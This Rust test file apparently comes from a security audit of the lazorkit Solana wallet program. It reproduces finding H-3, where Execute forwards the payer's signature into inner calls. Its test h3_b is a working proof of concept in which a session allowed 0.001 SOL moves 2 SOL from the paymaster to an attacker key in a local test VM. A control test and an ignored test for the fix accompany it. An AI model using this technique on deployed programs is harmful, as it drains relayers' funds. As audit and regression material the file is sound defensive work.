//! Reproduction for finding H-3 — `Execute` forwards every outer signer into
//! its inner CPIs, so a tightly restricted session can spend the paymaster's
//! own funds.
//!
//! `immediate.rs:295`
//! ```ignore
//! is_signer: acc.is_signer() || acc.key() == vault_pda.key(),
//! ```
//!
//! Session action limits track the *vault*. The payer is a different account,
//! so an inner `System::Transfer` sourced from the payer produces no vault
//! outflow, trips no limit, and is signed by the relay signature the payer
//! already had to provide (`try_collect_fee` requires `accounts[0].is_signer()`).
//!
//! `h3_a` is the control: the same session, spending from the vault, is
//! correctly stopped by `SolLimit`. That is what makes `h3_b` a hole rather
//! than "limits do not work".
//!
//! Run:  cargo test --features devnet -p lazorkit-program --test repro_h3_signer_forwarding

mod common;

use common::*;
use solana_sdk::{
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    signature::Keypair,
    signer::Signer,
};

/// `AuthError::ActionSolLimitExceeded`
const ERR_SOL_LIMIT_EXCEEDED: u32 = 3024;

/// The allowance the wallet owner believes they are handing out.
const SESSION_ALLOWANCE: u64 = 1_000_000; // 0.001 SOL

/// Account list for a session `Execute`.
///
/// Index layout:
///   `0` payer · `1` wallet · `2` session PDA · `3` vault
///   `4` system program · `5` destination · `6` session key
fn session_execute_accounts(
    context: &TestContext,
    wallet: &WalletFixture,
    session_pda: Pubkey,
    session: &Keypair,
    destination: Pubkey,
) -> Vec<AccountMeta> {
    with_protocol_fee_accounts(
        vec![
            AccountMeta::new(context.payer.pubkey(), true),
            AccountMeta::new_readonly(wallet.wallet_pda, false),
            AccountMeta::new(session_pda, false),
            AccountMeta::new(wallet.vault_pda, false),
            AccountMeta::new_readonly(solana_sdk::system_program::id(), false),
            AccountMeta::new(destination, false),
            AccountMeta::new_readonly(session.pubkey(), true),
        ],
        context,
    )
}

/// `Execute` data whose single inner instruction is
/// `System::Transfer(accounts[from_idx] -> accounts[5])`.
fn transfer_from_index(from_idx: u8, lamports: u64) -> Vec<u8> {
    let mut data = vec![4u8]; // Execute
    data.extend_from_slice(&encode_compact(&[(
        4, // program_id_index -> system program
        vec![from_idx, 5],
        system_transfer_data(lamports),
    )]));
    data
}

fn lamports_of(context: &TestContext, key: &Pubkey) -> u64 {
    context.svm.get_account(key).map(|a| a.lamports).unwrap_or(0)
}

/// A session locked down as tightly as the action model allows: it may only
/// touch the System Program, and only for a 0.001 SOL lifetime allowance.
fn restricted_session(context: &mut TestContext, wallet: &WalletFixture) -> Keypair {
    let mut actions = action_sol_limit(SESSION_ALLOWANCE);
    actions.extend_from_slice(&action_program_whitelist(solana_sdk::system_program::id()));
    create_session_with_actions(context, wallet, &actions)
}

// ─────────────────────────────────────────────────────────────────────────
// H-3a — CONTROL: SolLimit does stop vault spending
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h3_a_control_sol_limit_stops_vault_overspend() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 500_000_000);
    let session = restricted_session(&mut context, &wallet);
    let session_pda = session_pda_for(context.program_id, &wallet, &session);

    let destination = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();
    let vault_before = lamports_of(&context, &wallet.vault_pda);

    // Within the allowance: fine.
    let ix = Instruction {
        program_id: context.program_id,
        accounts: session_execute_accounts(&context, &wallet, session_pda, &session, destination),
        data: transfer_from_index(3, 500_000), // index 3 = vault
    };
    try_send(&mut context.svm, &payer, &[ix], &[&payer, &session])
        .expect("spending inside the allowance must work");
    assert_eq!(lamports_of(&context, &destination), 500_000);

    // Over the allowance: blocked.
    advance(&mut context.svm);
    let ix = Instruction {
        program_id: context.program_id,
        accounts: session_execute_accounts(&context, &wallet, session_pda, &session, destination),
        data: transfer_from_index(3, 100_000_000),
    };
    assert_custom_error(
        try_send(&mut context.svm, &payer, &[ix], &[&payer, &session]),
        ERR_SOL_LIMIT_EXCEEDED,
        "H-3a: SolLimit works for what it covers",
    );

    assert_eq!(
        lamports_of(&context, &wallet.vault_pda),
        vault_before - 500_000,
        "H-3a: only the permitted amount left the vault"
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H-3b — the same session empties the paymaster instead
// ─────────────────────────────────────────────────────────────────────────

#[test]
fn h3_b_restricted_session_drains_the_paymaster() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 500_000_000);
    let session = restricted_session(&mut context, &wallet);
    let session_pda = session_pda_for(context.program_id, &wallet, &session);

    let attacker = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();

    let payer_before = lamports_of(&context, &payer.pubkey());
    let vault_before = lamports_of(&context, &wallet.vault_pda);
    let actions_before = session_actions(&context.svm, session_pda);

    // 0.001 SOL is the session's entire authority. This moves 2 SOL —
    // 2000x the allowance — by sourcing it from account index 0, the payer,
    // whose signature was forwarded verbatim into the inner CPI.
    let stolen = 2_000_000_000;
    assert!(
        payer_before > stolen,
        "the relayer must be holding more than the session's allowance for this \
         to be interesting; it holds {payer_before}"
    );

    let ix = Instruction {
        program_id: context.program_id,
        accounts: session_execute_accounts(&context, &wallet, session_pda, &session, attacker),
        data: transfer_from_index(0, stolen), // index 0 = payer / paymaster
    };

    try_send(&mut context.svm, &payer, &[ix], &[&payer, &session])
        .expect("H-3b: Execute forwarded the paymaster's signature into the inner transfer");

    assert_eq!(
        lamports_of(&context, &attacker),
        stolen,
        "H-3b: {stolen} lamports taken from the relayer by a session limited to {SESSION_ALLOWANCE}"
    );

    // Every guard stayed quiet, because every guard watches the vault.
    assert_eq!(
        lamports_of(&context, &wallet.vault_pda),
        vault_before,
        "H-3b: the vault is untouched, so no action limit ever evaluated"
    );
    assert_eq!(
        session_actions(&context.svm, session_pda),
        actions_before,
        "H-3b: SolLimit.remaining was not decremented — the spend was invisible to it"
    );

    let payer_after = lamports_of(&context, &payer.pubkey());
    assert!(
        payer_before - payer_after >= stolen,
        "H-3b: the relayer paid {} lamports",
        payer_before - payer_after
    );
}

// ─────────────────────────────────────────────────────────────────────────
// H-3c — the fix, stated as a test
// ─────────────────────────────────────────────────────────────────────────

/// After `Execute` stops forwarding outer signers and only signs for the
/// vault, the inner transfer sourced from the payer has no valid signature and
/// the System Program rejects it. Vault-sourced transfers keep working.
#[test]
#[ignore = "enable together with the signer-forwarding fix; fails until then"]
fn h3_c_paymaster_signature_should_not_be_forwarded() {
    let mut context = setup_test();
    let wallet = create_ed25519_wallet(&mut context, 500_000_000);
    let session = restricted_session(&mut context, &wallet);
    let session_pda = session_pda_for(context.program_id, &wallet, &session);

    let attacker = Pubkey::new_unique();
    let payer = context.payer.insecure_clone();
    let payer_before = lamports_of(&context, &payer.pubkey());

    let ix = Instruction {
        program_id: context.program_id,
        accounts: session_execute_accounts(&context, &wallet, session_pda, &session, attacker),
        data: transfer_from_index(0, 2_000_000_000),
    };
    let result = try_send(&mut context.svm, &payer, &[ix], &[&payer, &session]);
    assert!(
        result.is_err(),
        "H-3c: an inner transfer sourced from the payer must fail without a forwarded signature"
    );

    assert_eq!(
        lamports_of(&context, &attacker),
        0,
        "H-3c: nothing reached the attacker"
    );
    // Only the transaction fee should be gone.
    assert!(
        payer_before - lamports_of(&context, &payer.pubkey()) < 1_000_000,
        "H-3c: the relayer kept its balance"
    );

    // The vault path must be unaffected by the fix.
    advance(&mut context.svm);
    let ix = Instruction {
        program_id: context.program_id,
        accounts: session_execute_accounts(&context, &wallet, session_pda, &session, attacker),
        data: transfer_from_index(3, 500_000),
    };
    try_send(&mut context.svm, &payer, &[ix], &[&payer, &session])
        .expect("H-3c: vault-signed transfers must still work");
    assert_eq!(lamports_of(&context, &attacker), 500_000);
}
